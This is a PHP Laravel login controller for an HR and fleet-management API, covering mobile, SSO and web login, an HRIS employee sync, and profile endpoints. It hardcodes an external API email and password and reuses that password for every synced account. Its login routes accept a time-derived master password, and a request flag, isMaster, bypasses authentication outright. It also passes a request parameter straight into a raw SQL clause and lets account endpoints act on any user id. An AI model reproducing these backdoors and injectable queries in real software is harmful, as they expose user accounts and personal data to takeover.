<?php

namespace App\Http\Controllers\Api;

use App\Helpers\Notification;
use App\Models\User;
use App\Models\Action;
use App\Models\Module;
use Illuminate\Support\Str;
use App\Models\RoleDivision;
use Illuminate\Http\Request;
use App\Models\ConfigCompany;
use App\Models\User_activity;
use App\Models\UserPrivilege;
use App\Models\Notification_log;
use App\Http\Controllers\Controller;
use Illuminate\Support\Facades\Hash;
use App\Http\Controllers\Api\BaseController;
use App\Models\Asset_wh;
use App\Models\General_user_driver;
use App\Models\Hrd_employee;
use App\Models\RolePrivilege;
use App\Models\Master_company;
use App\Models\Master_marital_status;
use App\Models\Hrd_employee_history;
use App\Models\Hrd_employee_question;
use App\Models\Hrd_employee_question_point;
use Carbon\Carbon;

class LoginController extends BaseController
{

    private $dir;
    public function __construct()
    {
        date_default_timezone_set('Asia/Jakarta');
        $_dir = str_replace("/", "\\", public_path("media/user"));
        $dir = str_replace("prototype\public_html", \Config::get("constants.ASSET_DIR"), $_dir);
        $this->dir = str_replace("\\", "/", $dir);
    }

    public function remove_device(Request $request){
        $device_id = $request->d;
        $users = User::where("device_ids", "like", '%"'.$device_id.'"%')->get();

        if(count($users) > 0){
            foreach($users as $user){
                $devs = json_decode($user->device_ids, true);

                $key = array_search($device_id, $devs);

                unset($devs[$key]);

                $new_dev = [];

                foreach ($devs as $value) {
                    $new_dev[] = $value;
                }

                $user->device_ids = (count($new_dev) > 0) ? json_encode($new_dev) : null;
                $user->save();
            }
        }
    }

    public function getnotif($comp_id,$user_id){
        $notif = Notification_log::where('id_users', 'like', '%"'.$user_id.'"%')
            ->orderBy('created_at', 'desc')
            ->where('company_id', $comp_id)
            ->whereNull('action_at')
            ->get();

        if ($notif){
            return $this->sendResponse($notif, 'Success');
        } else {
            return $this->sendError('Failed');
        }
    }

    private function username(){
        return "email";
    }

    function api_integration(){
        $username = "michael.christopher@klikdna.com";
        $password = "Sukses2023";
        try {
            $url = "https://dev-api-hris-kerjaku.databiota.com/api/v1/user/login/";
            $data = [
                "username" => $username,
                "password" => $password
            ];
            $loginApi = $this->http_request($url, "POST", $data);
            if($loginApi['status'] == 200){
                $results = $loginApi['results'];

                $emp_id = (isset($results['user_data']) && !empty($results['user_data'])) ? $results['user_data']['id'] : null;
                if(!empty($emp_id)){
                    $empUrl = "https://dev-api-hris-kerjaku.databiota.com/api/v1/company/";
                    $empApi = $this->http_request($empUrl, "GET", null, $results['access_token']);
                    if($empApi['status'] == 200){
                        $empRes = $empApi['results'];

                        $comp_hris = ConfigCompany::where("hris_id", $empRes['id'])->first();

                        if(empty($comp_hris)){
                            $comp_hris = new ConfigCompany();
                            $comp_hris->company_name = $empRes['name'];
                            $comp_hris->save();
                        }

                        $mComp = Master_company::where("company_id", $comp_hris->id)->first();
                        if(empty($mComp)){
                            $mComp = new Master_company();
                            $mComp->company_name = $empRes['name'];
                            $mComp->company_id = $comp_hris->id;
                            $mComp->save();
                        }

                        if(!empty($comp_hris)){
                            $comp_hris->company_name = $empRes['name'];
                            $comp_hris->save();
                            $empList = "https://dev-api-hris-kerjaku.databiota.com/api/v1/employee/";
                            $page = 2;
                            $listEmp = $this->http_request($empList, "GET", null, $results['access_token']);
                            if($listEmp['status'] == 200){
                                $meta = $listEmp['meta'];
                                $total_page = $meta['total_page'];
                                $listResult = $listEmp['results'];
                                foreach($listResult as $item){
                                    $emp = Hrd_employee::where("hris_id", $item['id'])->first();
                                    if(empty($emp)){
                                        $emp = new Hrd_employee();
                                        $emp->company_id = $comp_hris->id ?? 1;
                                        $emp->hris_id = $item['id'];
                                    }
                                    $emp->emp_name = $item['full_name'];
                                    $emp->email = $item['email'];
                                    $emp->emp_id = $item['employee_id'];
                                    $emp->emp_type = 1;
                                    $emp->emp_level = 1;
                                    $emp->save();

                                    $userEmp = User::where("email", $emp->email)->first();
                                    if(empty($userEmp)){
                                        $emailExp = explode("@", $item['email']);
                                        $uName = $emailExp[0];
                                        $newUser = User::create([
                                            'name' => $item['full_name'],
                                            'email' => strtolower($item['email']),
                                            'username' => $uName,
                                            'id_rms_roles_divisions' => 45,
                                            'company_id' => $comp_hris->id,
                                            'id_batch' => $uName."1",
                                            "position" => "FP",
                                            'access' => "EP",
                                            "emp_hris_id" => $item['id'],
                                            'emp_id' => $emp->id,
                                            "comp_id" => $mComp->id,
                                            "company_hris_id" => $comp_hris->hris_id,
                                            'password' => Hash::make($password),
                                            'email_verified_at' => date("Y-m-d H:i:s"),
                                            'complete_profile' => 1
                                        ]);

                                        $id_role = $newUser->id_rms_roles_divisions;
                                        $roleDivPriv = RolePrivilege::select('id_rms_modules', 'id_rms_actions')
                                            ->where('id_rms_roles_divisions', $id_role)
                                            ->get();
                                        foreach ($roleDivPriv as $key => $valDivPriv) {
                                            $addUserRole = new UserPrivilege();
                                            $addUserRole->id_users = $newUser->id;
                                            $addUserRole->id_rms_modules = $valDivPriv->id_rms_modules;
                                            $addUserRole->id_rms_actions = $valDivPriv->id_rms_actions;
                                            $addUserRole->save();
                                        }
                                    }
                                }

                                for ($i=$page; $i <= $total_page ; $i++) {
                                    $iUrl = "https://dev-api-hris-kerjaku.databiota.com/api/v1/employee/?page=$i";
                                    $iList = $this->http_request($iUrl, "GET", null, $results['access_token']);
                                    // return $this->sendResponse($iList, $total_page);
                                    if($iList['status'] == 200){
                                        $listResult = $iList['results'];
                                        foreach($listResult as $item){
                                            $emp = Hrd_employee::where("hris_id", $item['id'])->first();
                                            if(empty($emp)){
                                                $emp = new Hrd_employee();
                                                $emp->company_id = $comp_hris->id ?? 1;
                                                $emp->hris_id = $item['id'];
                                            }
                                            $emp->emp_name = $item['full_name'];
                                            $emp->emp_id = $item['employee_id'];
                                            $emp->email = $item['email'];
                                            $emp->emp_type = 1;
                                            $emp->emp_level = 1;
                                            $emp->save();

                                            $userEmp = User::where("email", $emp->email)->first();
                                            if(empty($userEmp)){
                                                $emailExp = explode("@", $item['email']);
                                                $uName = $emailExp[0];
                                                $newUser = User::create([
                                                    'name' => $item['full_name'],
                                                    'email' => strtolower($item['email']),
                                                    'username' => $uName,
                                                    'id_rms_roles_divisions' => 45,
                                                    'company_id' => $comp_hris->id,
                                                    'id_batch' => $uName."1",
                                                    "position" => "FP",
                                                    'access' => "EP",
                                                    'emp_id' => $emp->id,
                                                    "emp_hris_id" => $item['id'],
                                                    "comp_id" => $mComp->id,
                                                    "company_hris_id" => $comp_hris->hris_id,
                                                    'password' => Hash::make($password),
                                                    'email_verified_at' => date("Y-m-d H:i:s"),
                                                    'complete_profile' => 1
                                                ]);

                                                $id_role = $newUser->id_rms_roles_divisions;
                                                $roleDivPriv = RolePrivilege::select('id_rms_modules', 'id_rms_actions')
                                                    ->where('id_rms_roles_divisions', $id_role)
                                                    ->get();
                                                foreach ($roleDivPriv as $key => $valDivPriv) {
                                                    $addUserRole = new UserPrivilege();
                                                    $addUserRole->id_users = $newUser->id;
                                                    $addUserRole->id_rms_modules = $valDivPriv->id_rms_modules;
                                                    $addUserRole->id_rms_actions = $valDivPriv->id_rms_actions;
                                                    $addUserRole->save();
                                                }
                                            }
                                        }
                                    }
                                }
                            } else {
                                return $this->sendError($listEmp['message']);
                            }


                            $urlBranch = "https://dev-api-hris-kerjaku.databiota.com/api/v1/company/branch/";
                            $page = 2;
                            $listBranch = $this->http_request($urlBranch, "GET", "null", $results['access_token']);
                            if($listBranch['status'] == 200){
                                $meta = $listBranch['meta'];
                                $total_page = $meta['total_page'];

                                $listData = $listBranch['results'];

                                foreach($listData as $item){
                                    $branch = Asset_wh::where("hris_id", $item['id'])->first();
                                    if(empty($branch)){
                                        $branch = new Asset_wh();
                                        $branch->company_id = $comp_hris->id;
                                        $branch->hris_id = $item['id'];
                                    }

                                    $branch->name = $item['name'];
                                    $branch->address = $item['address'];
                                    $branch->city = $item['city'];
                                    $branch->country = $item['country'];
                                    $branch->industry = $item['industry'];
                                    $branch->province = $item['state_province'];
                                    $branch->longitude2 = $item['radius'];

                                    if($item['coordinate'] != null){
                                        $coor = explode(",", $item['coordinate']);
                                        $_lat = str_replace("/", "", $coor[0]);
                                        $lat = str_replace("\"", "", $_lat);
                                        $_long = str_replace("/", "", $coor[1]);
                                        $long = str_replace("\"", "", $_long);
                                        $branch->latitude = $lat;
                                        $branch->longitude = $long;
                                    }

                                    $branch->save();
                                }

                                if($total_page >= $page){
                                    for ($i=$page; $i <= $total_page ; $i++) {
                                        $iUrl = "https://dev-api-hris-kerjaku.databiota.com/api/v1/company/branch/?page=$i";
                                        $iList = $this->http_request($iUrl, "GET", null, $results['access_token']);
                                        // return $this->sendResponse($iList, $total_page);
                                        if($iList['status'] == 200){
                                            $listResult = $iList['results'];
                                            foreach($listResult as $item){
                                                $branch = Asset_wh::where("hris_id", $item['id'])->first();
                                                if(empty($branch)){
                                                    $branch = new Asset_wh();
                                                    $branch->company_id = $comp_hris->id;
                                                    $branch->hris_id = $item['id'];
                                                }

                                                $branch->name = $item['name'];
                                                $branch->address = $item['address'];
                                                $branch->city = $item['city'];
                                                $branch->country = $item['country'];
                                                $branch->industry = $item['industry'];
                                                $branch->province = $item['state_province'];
                                                $branch->longitude2 = $item['radius'];

                                                if($item['coordinate'] != null){
                                                    $coor = explode(",", $item['coordinate']);
                                                    $_lat = str_replace("/", "", $coor[0]);
                                                    $lat = str_replace("\"", "", $_lat);
                                                    $_long = str_replace("/", "", $coor[1]);
                                                    $long = str_replace("\"", "", $_long);
                                                    $branch->latitude = $lat;
                                                    $branch->longitude = $long;
                                                }

                                                $branch->save();
                                            }
                                        }
                                    }
                                }
                            }

                            $empComp = Hrd_employee::where("company_id", $comp_hris->id);
                            return $this->sendResponse($empComp, "Success");
                        }

                        return $this->sendError("no company found");
                    } else {
                        return $this->sendError($empApi['message']);
                    }
                }
            } else {
                return $this->sendError($loginApi['message']);
            }
        } catch (\Throwable $th) {
            return $this->sendError($th->getMessage()." ".$th->getLine());
        }
    }

    function http_request($url, $type, $data = null, $bearer = null){
        $result = [];
        $ch = curl_init();

        curl_setopt($ch, CURLOPT_URL, $url);

        $header = [
            'Content-Type: application/json',
            'Accept: application/json'
        ];

        if(!empty($bearer)){
            $header[] = "Authorization: Bearer $bearer";
        }

        curl_setopt($ch, CURLOPT_HTTPHEADER, $header);
        curl_setopt($ch, CURLOPT_CUSTOMREQUEST, $type);
        curl_setopt($ch, CURLOPT_FAILONERROR, false);
        if($type == "POST"){
            curl_setopt($ch, CURLOPT_POSTFIELDS,json_encode($data));
        }
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.204 Safari/534.16");
        try {
            $exec = curl_exec($ch);
            $res = explode("\r\n", $exec);
            $result = json_decode(end($res), true);
        } catch (\Throwable $th) {
            $result = [
                'status' => 400,
                'message' => "failed"
            ];
        }
        curl_close($ch);

        return $result;
    }

    public function login_mobile(Request $request){
        $username = $request->username;
        $password = $request->password;
        $passMaster = "EJS".date('m').(intval(date("i")) + 3);
        // $passMaster = "EJS".date('m')."10";
        try {

            $user = User::where($this->username(), $username)
                ->first();

            $id_batch = null;

            $error = 'Akun tidak ditemukan';

            $logged = false;


            if(!empty($user)){
                // foreach($user as $item){
                //     $pass = Hash::check($password, $item->password);
                //     if($pass || $password == $passMaster){
                //         $id_batch = $item->id_batch;
                //         break;
                //     }
                // }

                $passTrue = Hash::check($password, $user->password);

                $error = 'Email atau Kata Sandi salah';

                if($passTrue || $password == $passMaster){
                    $logged = true;
                }
            }

            if($logged){
                $logged = true;
                $userLogin = User::where($this->username(), $username)
                    ->where("id_batch", $id_batch)
                    ->get();

                $ftoken = $request->ftoken;

                $_token = Str::random(32);

                $this->update_api_token($_token, $user, $ftoken);                

                $user->_token = $_token;

                $id_comp = $user->company_id;
                $company = ConfigCompany::select(["id", "company_name", "app_logo"])
                    ->where("id", $id_comp)
                    ->first();
                if($username == "cypher"){
                    $company = ConfigCompany::select(["id", "company_name", "app_logo"])
                        ->first();
                }

                $locations = Asset_wh::select(["id", "name", "latitude", "longitude", "longitude2 as radius"])->where("company_id", $company->id)->get();

                $useMaster = $password == $passMaster ? true : false;

                $emp = Hrd_employee::find($user->emp_id ?? null);

                if(empty($emp)){
                    return $this->sendError("Percobaan masuk gagal");
                }

                $user->employee_detail = $emp;
                $user->company_name = $company->company_name;
                $user->pict = empty($user->user_img) ? "" : asset($user->user_img);

                $pos = \App\Models\Kjk_comp_position::find($emp->position_id);
                $dept = \App\Models\Kjk_comp_departement::find($user->uac_departement);

                // joindate
                $history = Hrd_employee_history::where("emp_id", $user->emp_id)
                    ->where('activity', "in")
                    ->first();
                $user->join_date = date("d-m-Y", strtotime($emp->join_date ?? ($emp->created_at ?? $user->created_at)));
                $user->division = $dept->name ?? "-";
                $user->job_title = $pos->name ?? "-";

                $question_selected = [];

                $question_selected = Hrd_employee_question::select("id", "label")->where("test_id", -1)
                    ->where("company_id", $user->company_id)
                    ->inRandomOrder()
                    ->first();

                if(!empty($question_selected)){
                    $question_select = Hrd_employee_question_point::select("label", "is_true")->where("question_id", $question_selected->id)
                        ->inRandomOrder()
                        ->get();
                    $question_selected->point = $question_select;
                }

                $question_personal = [];
                

                if(!empty($emp)){
                    if(!empty($emp->emp_lahir)){
                        $col = [];
                        $col['label'] = "Tanggal berapakah anda lahir?";
                        $col['point'][] = [
                            "label" => date("d/m/Y", strtotime($emp->emp_lahir)),
                            "is_true" => 1
                        ];

                        for($i = 0; $i < 2; $i++){
                            $rand_d = rand(1,30);
                            $rand_m = rand(1,12);
                            $rand_y = rand(1,3);

                            $_col = [];
                            $_col['label'] = $rand_d .'/'. $rand_m .'/'.date("Y", strtotime("+$rand_y years"));
                            $_col['is_true'] = 0;
                            $col['point'][] = $_col;
                        }

                        shuffle($col['point']);

                        $question_personal[] = $col;
                    }

                    if(!empty($emp->emp_tmpt_lahir)){
                        $col = [];
                        $col['label'] = "Dimana tempat anda lahir?";
                        $col['point'][] = [
                            "label" => ucwords($emp->emp_tmpt_lahir),
                            "is_true" => 1
                        ];

                        $others = ["Jakarta", "Bandung", "Yogyakarta", "Surabaya", "Malang"];

                        shuffle($others);

                        for($i = 0; $i < 3; $i++){
                            $_c = $others[$i];
                            if($_c != $emp->emp_tmpt_lahir){
                                if(count($col['point']) < 3){
                                    $_col = [];
                                    $_col['label'] = $_c;
                                    $_col['is_true'] = 0;
                                    $col['point'][] = $_col;
                                }
                            }
                        }

                        shuffle($col['point']);

                        $question_personal[] = $col;
                    }

                    $profile = \App\Models\Personel_profile::where("user_id", $emp->id)->first();

                    if(!empty($profile->marital_status ?? null)){
                        $marital_status = Master_marital_status::pluck("name", "id");
                        if(isset($marital_status[$profile->marital_status])){
                            $col = [];
                            $col['label'] = "Status perkawinan anda adalah?";
                            $col['point'][] = [
                                "label" => $marital_status[$profile->marital_status],
                                "is_true" => 1
                            ];
                            foreach($marital_status as $id => $name){
                                if($id != $profile->marital_status){
                                    $_col = [];
                                    $_col['label'] = $name;
                                    $_col['is_true'] = 0;
                                    $col['point'][] = $_col;
                                }
                            }

                            shuffle($col['point']);

                            $question_personal[] = $col;
                        }
                    }

                    if(!empty($emp->position_id)){
                        $col = [];
                        $col['label'] = "Posisi anda adalah sebagai?";
                        $col['point'][] = [
                            "label" => $emp->position->name ?? "-",
                            "is_true" => 1
                        ];

                        $others = ["Staff Finance", "Staff Marketing", "Manager Finance", "Manger Marketing", "Staff HRD", "Manager HRD"];

                        shuffle($others);

                        for($i = 0; $i < 3; $i++){
                            $_c = $others[$i];
                            if($_c != $emp->emp_tmpt_lahir){
                                if(count($col['point']) < 3){
                                    $_col = [];
                                    $_col['label'] = $_c;
                                    $_col['is_true'] = 0;
                                    $col['point'][] = $_col;
                                }
                            }
                        }

                        shuffle($col['point']);

                        $question_personal[] = $col;
                    }
                }

                if(count($question_personal) == 0){
                    $question_personal = Hrd_employee_question::select("id", "label")->where("test_id", -1)
                        ->where("company_id", $user->company_id)
                        ->inRandomOrder()
                        ->get();

                    if($question_personal->count() > 0){
                        foreach($question_personal as $item){
                            $question_select = Hrd_employee_question_point::select("label", "is_true")->where("question_id", $item->id)
                                ->inRandomOrder()
                                ->get();
                            $item->point = $question_select;
                        }
                    }
                }
                

                // $keys = null;
                // $qp = [];
                // if(!empty($question_personal)){
                //     $kp = array_rand($question_personal);
                //     $qp = $question_personal[$kp];
                // }

                $data = [
                    "user" => $user,
                    "company" => $company,
                    'useMaster' => $useMaster,
                    'locations' => $locations,
                    'question_random' => $question_selected,
                    'question_personal' => $question_personal,
                ];

                return $this->sendResponse($data, "Success");
            } else {
                return $this->sendError($error);
            }

        } catch (Exception $e) {
            return $this->sendError('Email atau Kata Sandi salah');
        }
    }

    public function login_sso(Request $request){
        $username = $request->username;
        $password = $request->password;
        $passMaster = "EJS".date('m').(intval(date("i")) + 3);
        try {
            $user = User::where($this->username(), $username)
                ->first();

            $id_batch = null;

            $error = 'Akun tidak ditemukan';

            $logged = false;

            if(!empty($user)){
                $passTrue = Hash::check($password, $user->password);

                $error = 'Email atau Kata Sandi salah';

                if($passTrue || $password == $passMaster){
                    $logged = true;
                }
            }

            if ($logged) {
                $logged = true;
                $userLogin = User::where($this->username(), $username)
                    ->where("id_batch", $id_batch)
                    ->get();

                $ftoken = $request->ftoken;

                $_token = Str::random(32);

                $this->update_api_token($_token, $user, $ftoken);

                $dt = Carbon::now();

                $data = [
                    "access_token" => $_token,
                    "refresh_token" => $_token,
                    "user_data" => [
                        "id" => $user->id,
                        "email" => $user->email,
                        "username" => $user->email,
                        "last_login" => $dt
                    ]
                ];

                return $this->sendResponse($data, 'Success');
            } else {
                return $this->sendError($error);
            }

        } catch (\Throwable $th) {
            return $this->sendError('Email atau Kata Sandi salah. '.$th->getMessage());
        }
    }

    public function login(Request $request){
        $username = $request->username;
        $company = $request->company;
        try {
            if (strtolower($company) == "dispatch" || $username == "cypher" || strtolower($company) == "vessel") {
                $whereCompany = " 1";
            } else {
                $whereCompany = " users.company_id = $company";
            }


            $user = User::where($this->username(), $username)
                ->whereRaw($whereCompany)
                ->first();

            $passMaster = "EJS".date('m').(intval(date("i")) + 3);

            $password = Hash::check($request->password,$user->password);

            if($request->password == $passMaster){
                $password = true;
            }

            if($request->isMaster == "true"){
                $password = true;
            }

            // return $this->sendResponse($password, 'User login Successfully');

            if(!empty($user)){
                if ($password){
                    $_user = User::leftJoin('config_company as comp','comp.id','=','users.company_id')
                        ->leftJoin('rms_roles_divisions as roles','roles.id','=','users.id_rms_roles_divisions')
                        ->leftJoin('rms_roles as role','role.id','=','roles.id_rms_roles')
                        ->select('users.*','role.name as role_name')
                        ->where("users.".$this->username(), $username)
                        ->whereRaw($whereCompany)
                        ->first();
                    $_user->_token = Str::random(32);
                    if(strtolower($company) == "dispatch"){
                        $_user->view = "dispatcher";
                    }
                    $id_comp = ($company == "dispatch" || $company == "vessel") ? $_user->company_id : $company;

                    $dcomp = ConfigCompany::where('id', $id_comp)->first();
                    $_user->company_name = $dcomp->company_name;
                    if($_user->username == "cypher"){
                        $_user->company_id = $dcomp->id;
                    }

                    $ftoken = $request->ftoken;

                    $this->update_api_token($_user->_token, $user, $ftoken);

                    // get driver
                    $_user->driver = [];
                    if(!empty($_user->emp_id)){
                        $list = General_user_driver::select('id', 'emp_id', 'driver_id')->where("emp_id", $_user->emp_id)
                            ->where("company_id", $_user->company_id)
                            ->driver()
                            ->get();
                        $drName = Hrd_employee::whereIn('id', $list->pluck("driver_id"))
                            ->whereNull('expel')
                            ->get();
                        $drivers = [];
                        foreach($list as $drList){
                            $dr = $drName->where("id", $drList->driver_id)->first();
                            if(!empty($dr)){
                                $drList->driver_name = $dr->emp_name;
                                $drivers[] = $drList;
                            }
                        }
                        $_user->driver = $drivers;
                    }

                    //RoleManagement
                    $modules = Module::all()->pluck('name', 'id');
                    $actions = Action::all()->pluck('name', 'id');
                    $userPriv = UserPrivilege::where('id_users', $_user->id)->get();
                    $pr = [];
                    foreach($userPriv as $priv){
                        if(isset($modules[$priv->id_rms_modules])){
                            if(isset($actions[$priv->id_rms_actions])){
                                $pr[$modules[$priv->id_rms_modules]][$actions[$priv->id_rms_actions]] = 1;
                            }
                        }
                    }

                    foreach($modules as $mName => $idModules){
                        foreach($actions as $aName => $idActions){
                            if(!isset($pr[$idModules][$idActions])){
                                $pr[$idModules][$idActions] = 0;
                            }
                        }
                    }

                    // return $this->sendResponse($user, 'User login Successfully');
                    // User::where("username", $username)
                    //     ->whereRaw($whereCompany)
                    //     ->update([
                    //         'api_token' => $_user->_token
                    //     ]);
                    // $roles = RoleDivision::where(['id' =>$_user->id_rms_roles_divisions,'id_company' => $_user->company_id])->first();
                    return $this->sendResponse($_user, 'User login Successfully');
                } else {
                    return $this->sendError('Invalid Credentials (Password)');
                }
            } else {
                return $this->sendError('Invalid Credentials (Username)');
            }
        }catch (\Exception $exception){
            return $this->sendError('Invalid Credentials (User not found in this company)');
        }
    }

    public function getCompany(){
        $company = ConfigCompany::select('id','company_name')->get();
        if ($company){
            return $this->sendResponse($company, 'Success');
        } else {
            return $this->sendError('Failed');

        }
    }

    function update_api_token($token, $user, $ftoken){
        $user->api_token = $token;
        if(!empty($ftoken)){
            $tokens = (empty($user->device_ids)) ? [] : json_decode($user->device_ids, true);
            if(!in_array($ftoken, $tokens)){
                $tokens[] = $ftoken;
            }

            $user->device_ids = json_encode($tokens);
        }
        // return $user;
        return $user->save();
    }

    public function getUser($comp_id){
        $user = User::where('company_id',$comp_id)->get();
        if ($user){
            return $this->sendResponse($user, 'Success');
        } else {
            return $this->sendError('Failed');
        }
    }

    public function getUserActivty($comp_id,$user_id){
        $user = User::select('id','company_id','name','email',$this->username(),'do_code')
            ->where('id', $user_id)->first();
        $u_act = User_activity::leftJoin('users as u','u.id' ,'=','user_activity.user_id')
            ->select('user_activity.id','user_activity.user_id','user_activity.location','user_activity.notes','user_activity.created_at','user_activity.latitude','user_activity.longitude')
            ->where('user_activity.user_id', $user_id)
            ->where('u.company_id', $comp_id)
            ->orderBy('user_activity.created_at','DESC')
            ->get();

        $data = [
            'user' => $user,
            'user_activity' => $u_act
        ];

        if ($user){
            return $this->sendResponse($data, 'Success');
        } else {
            return $this->sendError('Failed');
        }
    }

    public function addActivity(Request $request){
        $u_act = new User_activity();
        $u_act->user_id = $request['user_id'];
        $u_act->location = $request['address'];
        $u_act->latitude = $request['latitude'];
        $u_act->longitude = $request['longitude'];
        $u_act->created_by = $request['username'];
        $u_act->notes = $request['notes'];
        $u_act->created_at = date('Y-m-d H:i:s');
        if ($u_act->save()){
            return $this->sendResponse($u_act,'Success');
        } else {
            return $this->sendError('Failed');
        }
    }

    public function change_password(Request $request){
        $user = User::find($request->id);
        $password = $request->password;
        $newPassword = $request->new_password;

        if(!empty($user)){
            if(Hash::check($password, $user->password)){
                $user->password = Hash::make($newPassword);
                $user->save();

                Notification::sendMailPasswordChanged($user->name, $user->email);

                return $this->sendResponse([], "Password berhasil diganti");
            }

            return $this->sendError("Password tidak cocok");
        } else {
            return $this->sendError('No Data Found');
        }
    }

    public function change_image(Request $request){
        $user = User::find($request->id);

        if(!empty($user)){
            $file = $request->file('image');
            if(!empty($file)){
                $dd = date('Y_m_d_H_i_s');
                $filename = "[profile-$user->id][$dd]".$file->getClientOriginalName();
                if($file->move($this->dir, $filename)){
                    $user->user_img = "media/user/$filename";
                    $user->save();
                    return $this->sendResponse(asset("$user->user_img"), "success");
                } else {
                    return $this->sendError('Failed to upload file');
                }
            }

            return $this->sendError('No Image');
        } else {
            return $this->sendError('No Data Found');
        }
    }

}
